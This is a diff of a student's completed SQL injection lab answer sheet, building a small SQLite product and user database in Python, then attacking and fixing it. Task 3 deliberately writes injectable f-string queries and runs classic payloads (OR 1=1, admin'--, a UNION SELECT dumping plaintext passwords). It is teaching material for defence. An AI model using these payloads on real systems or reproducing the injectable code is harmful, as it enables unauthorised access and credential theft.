@@ -3,7 +3,7 @@ SQL INJECTION PRACTICAL ASSIGNMENT - ANSWERS
 Name:       AHUMUZA CONLEY MUTUNGI
 Student ID: [Your ID]
 Track:      Python
-Date:       [Date]
+Date:       8/5/2026
 GitHub:     https://github.com/ConleyMutungi/nyondo-sql-lab
 ============================================================
 
@@ -12,122 +12,256 @@ TASK 1 - DATABASE SETUP
 ============================================================
 
 setup.py code:
-[paste your setup.py code here]
+import sqlite3
+from tkinter import INSERT
+conn = sqlite3.connect('nyondo_stock.db')
+conn.execute('''
+CREATE TABLE IF NOT EXISTS products (
+id INTEGER PRIMARY KEY AUTOINCREMENT,
+name TEXT NOT NULL,
+description TEXT,
+price REAL NOT NULL
+)
+''')
+conn.executemany(
+'INSERT INTO products (name, description, price) VALUES (?, ?, ?)',
+[
+('Cement (bag)', 'Portland cement 50kg bag', 35000),
+('Iron Sheet 3m','Gauge 30 roofing sheet 3m long', 110000),
+('Paint 5L', 'Exterior wall paint white 5L', 60000),
+
+('Nails 1kg', 'Common wire nails 1kg pack', 12000),
+('Timber 2x4', 'Pine timber plank 2x4 per metre', 25000),
+]
+)
+conn.execute('''
+CREATE TABLE IF NOT EXISTS users (
+id INTEGER PRIMARY KEY AUTOINCREMENT,
+username TEXT NOT NULL,
+password TEXT NOT NULL,
+role TEXT DEFAULT 'attendant'
+)
+ ''')
+
+conn.executemany(
+'INSERT OR IGNORE INTO users (username, password, role) VALUES (?, ?, ?)',
+[
+('admin', 'admin123', 'admin'),
+('fatuma', 'pass456', 'attendant'),
+('wasswa', 'pass789', 'manager')
+]
+)
+conn.commit()
+rows = conn.execute('SELECT * FROM products').fetchall()
+for r in rows: print(r)
+
+conn.commit()
+rows = conn.execute('SELECT * FROM users').fetchall()
+for r in rows: print(r)
 
 Output from SELECT * (copy from your terminal):
-[paste the terminal output showing all 5 products here]
+(1, 'Cement (bag)', 'Portland cement 50kg bag', 38000.0)
+(2, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0)
+(3, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0)
+(4, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0)
+(5, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0)
+(6, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0)
+(7, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0)
+(8, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0)
+(9, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0)
+(10, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0)
+(11, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0)
+(12, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0)
+(13, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0)
+(14, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0)
+(15, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0)
 
 
 TASK 2 - QUERIES
 ============================================================
 
 queries.py code:
-[paste your queries.py code here]
+import sqlite3
+
+conn = sqlite3.connect('nyondo_stock.db')
+
+# Query A - Get every column of every product
+rows = conn.execute("SELECT * FROM products").fetchall()
+print("Query A:", rows)
+
+# Query B - Get only the name and price of all products
+rows = conn.execute("SELECT name, price FROM products").fetchall()
+print("Query B:", rows)
+
+# Query C - Get full details of the product with id = 3
+rows = conn.execute("SELECT * FROM products WHERE id = 3").fetchall()
+print("Query C:", rows)
+
+# Query D - Find all products whose name contains 'sheet'
+rows = conn.execute("SELECT * FROM products WHERE name LIKE '%sheet%'").fetchall()
+print("Query D:", rows)
+
+# Query E - Get all products sorted by price, highest first
+rows = conn.execute("SELECT * FROM products ORDER BY price DESC").fetchall()
+print("Query E:", rows)
+
+# Query F - Get only the 2 most expensive products
+rows = conn.execute("SELECT * FROM products ORDER BY price DESC LIMIT 2").fetchall()
+print("Query F:", rows)
+
+# Query G - Update the price of Cement (id=1) to 38,000 then SELECT * to confirm
+conn.execute("UPDATE products SET price = 38000 WHERE id = 1")
+conn.commit()
+rows = conn.execute("SELECT * FROM products").fetchall()
+print("Query G:", rows)
 
 Query A output:
-[paste output here]
+[(1, 'Cement (bag)', 'Portland cement 50kg bag', 38000.0), (2, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (3, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (4, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (5, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), (6, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (7, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (8, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (9, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (10, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), (11, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (12, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (13, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (14, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (15, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0)]
 
 Query B output:
-[paste output here]
+[('Cement (bag)', 38000.0), ('Iron Sheet 3m', 110000.0), ('Paint 5L', 60000.0), ('Nails 1kg', 12000.0), ('Timber 2x4', 25000.0), ('Cement (bag)', 35000.0), ('Iron Sheet 3m', 110000.0), ('Paint 5L', 60000.0), ('Nails 1kg', 12000.0), ('Timber 2x4', 25000.0), ('Cement (bag)', 35000.0), ('Iron Sheet 3m', 110000.0), ('Paint 5L', 60000.0), ('Nails 1kg', 12000.0), ('Timber 2x4', 25000.0)]
 
 Query C output:
-[paste output here]
+[(3, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0)]
 
 Query D output:
-[paste output here]
+[(2, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (7, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (12, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0)]
 
 Query E output:
-[paste output here]
+[(2, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (7, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (12, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (3, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (8, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (13, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (1, 'Cement (bag)', 'Portland cement 50kg bag', 38000.0), (6, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (11, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (5, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), (10, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), (15, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), (4, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (9, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (14, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0)]
 
 Query F output:
-[paste output here]
+[(2, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (7, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0)]
 
 Query G output (before and after price):
-[paste output here]
+[(1, 'Cement (bag)', 'Portland cement 50kg bag', 38000.0), (2, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (3, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (4, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (5, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), (6, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (7, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (8, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (9, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (10, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), (11, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (12, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (13, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (14, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (15, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0)]
 
 
 TASK 3 - ATTACKS
 ============================================================
 
 vulnerable.py code:
-[paste your vulnerable.py code here]
+import sqlite3
+from unicodedata import name
+conn = sqlite3.connect('nyondo_stock.db')
+
+def search_product(name):
+    query = f"SELECT * FROM products WHERE name LIKE '%{name}%'"
+    print(f'Query: {query}')
+    rows = conn.execute(query).fetchall()
+    print(f'Result: {rows}\n')
+    return rows
+
+def login(username, password):
+    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
+    print(f'Query: {query}')
+    row = conn.execute(query).fetchone()
+    print(f"Result: {row}\n")
+    return row
+
+search_product("' OR 1=1--")
+
+login("admin'--", "anything")
+
+login("' OR '1'='1", "' OR '1'='1")
+
+search_product("' UNION SELECT id, username, password, role FROM users--")
 
 ---
 
 ATTACK 1 - OR 1=1
 Query that printed:
-[copy the "Query built:" line from terminal]
+ SELECT * FROM products WHERE name LIKE '%' OR 1=1--%'
 
 Result:
-[copy the rows that came back]
+ [(1, 'Cement (bag)', 'Portland cement 50kg bag', 38000.0), (2, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (3, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (4, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (5, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), (6, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (7, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (8, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (9, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (10, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), (11, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (12, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (13, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (14, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (15, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0)]
 
 Why it worked (in your own words):
-[explain here - example: The ' closed the string early and OR 1=1
-made every row pass the WHERE check so all products came back]
+ OR 1=1 made every row pass the WHERE check so all products came back
 
 ---
 
 ATTACK 2 - Login bypass (admin'--)
 Query that printed:
-[copy the "Query built:" line from terminal]
+SELECT * FROM users WHERE username='admin'--' AND password='anything'
 
 Result:
-[copy the LOGIN SUCCESS / LOGIN FAILED line]
+(1, 'admin', 'admin123', 'admin')
 
 Why it worked:
-[explain here]
+The -- helps to jump all the checks and prints any username or password in the database.
 
 ---
 
 ATTACK 3 - Always true (' OR '1'='1)
 Query that printed:
-[copy the "Query built:" line]
+ * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'
 
 Result:
-[copy the result]
+ (1, 'admin', 'admin123', 'admin')
 
 Why it worked:
-[explain here]
+Bases on the fact that 1=1 which will always be ture therefore bypasses the security
 
 ---
 
 ATTACK 4 - UNION attack
 Query that printed:
-[copy the "Query built:" line]
+ SELECT * FROM products WHERE name LIKE '%' UNION SELECT id, username, password, role FROM users--%'
 
 Result (what data came back):
-[copy the rows - did you see usernames and passwords?]
+ [(1, 'Cement (bag)', 'Portland cement 50kg bag', 38000.0), (1, 'admin', 'admin123', 'admin'), (2, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (2, 'fatuma', 'pass456', 'attendant'), (3, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (3, 'wasswa', 'pass789', 'manager'), (4, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (4, 'admin', 'admin123', 'admin'), (5, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), (5, 'fatuma', 'pass456', 'attendant'), (6, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (6, 'wasswa', 'pass789', 'manager'), (7, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (8, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (9, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (10, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), (11, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (12, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (13, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (14, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (15, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0)]
 
 Why it worked:
-[explain here]
+Union select brings all data from the database
 
 
 TASK 4 - SECURE VERSION
 ============================================================
 
 secure.py code:
-[paste your secure.py code here]
+ import sqlite3
+conn = sqlite3.connect('nyondo_stock.db')
+
+# TODO: rewrite using ? placeholder - never use f-strings in SQL
+def search_product_safe(name):
+    query = "SELECT * FROM products WHERE name LIKE ?"
+    return conn.execute(query, (f'%{name}%',)).fetchall()
+
+def login_safe(username, password):
+    query = "SELECT * FROM users WHERE username=? AND password=?"
+    return conn.execute(query, (username, password)).fetchone()
+
+pass
+
+# These must ALL return [] or None when you run them
+print('Test 1:', search_product_safe("' OR 1=1--"))
+print('Test 2:', search_product_safe("' UNION SELECT id,username,password,role FROM users--"))
+print('Test 3:', login_safe("admin'--", 'anything'))
+print('Test 4:', login_safe("' OR '1'='1", "' OR '1'='1"))
+
+import sqlite3
+
+conn = sqlite3.connect('nyondo_stock.db')
+
 
 Output when attacks are run against secure functions
 (all must show 0 rows or LOGIN FAILED):
 
 Attack 1 output:
-[paste here]
+ []
 
 Attack 2 output:
-[paste here]
+ []
 
 Attack 3 output:
-[paste here]
+None
 
 Attack 4 output:
-[paste here]
+None
 
 Explanation - WHY do parameterised queries work?
 (write in your own words - 3 to 5 sentences):
-[write your explanation here]
-
-Example answer:
 With an f-string, Python builds one complete string and gives it to
 sqlite3. The database cannot tell which part the developer wrote and
 which part the attacker typed. With a ? placeholder, sqlite3 receives
@@ -136,28 +270,121 @@ is fixed first. Then the value is slotted in as pure data - it can
 never change the structure or be interpreted as a SQL command.
 
 
+
+
+
 TASK 5 - VALIDATION
 ============================================================
 
 secure.py with validation added:
-[paste your updated secure.py here]
+import sqlite3
+conn = sqlite3.connect('nyondo_stock.db')
+
+# TODO: rewrite using ? placeholder - never use f-strings in SQL
+def search_product_safe(name):
+    query = "SELECT * FROM products WHERE name LIKE ?"
+    return conn.execute(query, (f'%{name}%',)).fetchall()
+
+def login_safe(username, password):
+    query = "SELECT * FROM users WHERE username=? AND password=?"
+    return conn.execute(query, (username, password)).fetchone()
+
+pass
+
+# These must ALL return [] or None when you run them
+print('Test 1:', search_product_safe("' OR 1=1--"))
+print('Test 2:', search_product_safe("' UNION SELECT id,username,password,role FROM users--"))
+print('Test 3:', login_safe("admin'--", 'anything'))
+print('Test 4:', login_safe("' OR '1'='1", "' OR '1'='1"))
+
+import sqlite3
+
+conn = sqlite3.connect('nyondo_stock.db')
+
+# --- Validation helpers ---
+def validate_name(name):
+    if not isinstance(name, str):
+        print("Error: name must be a string")
+        return False
+    if len(name) < 2:
+        print("Error: name must be at least 2 characters")
+        return False
+    if any(c in name for c in "<>;"):
+        print("Error: name contains invalid characters")
+        return False
+    return True
+
+def validate_price(price):
+    try:
+        price = float(price)
+        if price <= 0:
+            print("Error: price must be positive")
+            return False
+    except ValueError:
+        print("Error: price must be a number")
+        return False
+    return True
+
+def validate_username(username):
+    if not isinstance(username, str):
+        print("Error: username must be a string")
+        return False
+    if not username.strip():
+        print("Error: username cannot be empty")
+        return False
+    if " " in username:
+        print("Error: username cannot contain spaces")
+        return False
+    return True
+
+def validate_password(password):
+    if not isinstance(password, str):
+        print("Error: password must be a string")
+        return False
+    if len(password) < 6:
+        print("Error: password must be at least 6 characters")
+        return False
+    return True
+
+# --- Secure functions with validation ---
+def search_product_safe(name):
+    if not validate_name(name):
+        return None
+    query = "SELECT * FROM products WHERE name LIKE ?"
+    rows = conn.execute(query, (f"%{name}%",)).fetchall()
+    return rows
+
+def login_safe(username, password):
+    if not validate_username(username) or not validate_password(password):
+        return None
+    query = "SELECT * FROM users WHERE username=? AND password=?"
+    row = conn.execute(query, (username, password)).fetchone()
+    return row
+
+# --- Tests ---
+print("Test 1:", search_product_safe("cement"))       # works
+print("Test 2:", search_product_safe(""))             # rejected
+print("Test 3:", search_product_safe("<script>"))     # rejected
+print("Test 4:", login_safe("admin", "admin123"))     # works
+print("Test 5:", login_safe("admin", "ab"))           # rejected (too short)
+print("Test 6:", login_safe("ad min", "pass123"))     # rejected (space in username)
 
 Test case results (copy from terminal):
 
 Test 1 - search 'cement':
-[paste output - should work and return the product]
+ [(1, 'Cement (bag)', 'Portland cement 50kg bag', 38000.0), (6, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (11, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0)]
 
 Test 2 - search '':
-[paste output - should say REJECTED]
+ name must be at least 2 characters - REJECTED
 
 Test 3 - search '<script>':
-[paste output - should say REJECTED]
+ name contains invalid characters - REJECTED
 
 Test 4 - login admin/admin123:
-[paste output - should say LOGIN SUCCESS]
+ (1, 'admin', 'admin123', 'admin')
 
 Test 5 - login admin/ab:
-[paste output - should say REJECTED password too short]
+ password must be at least 6 characters - REJECTED
 
 Test 6 - login 'ad min'/pass123:
-[paste output - should say REJECTED username]
+Error: username cannot contain spaces - REJECTED
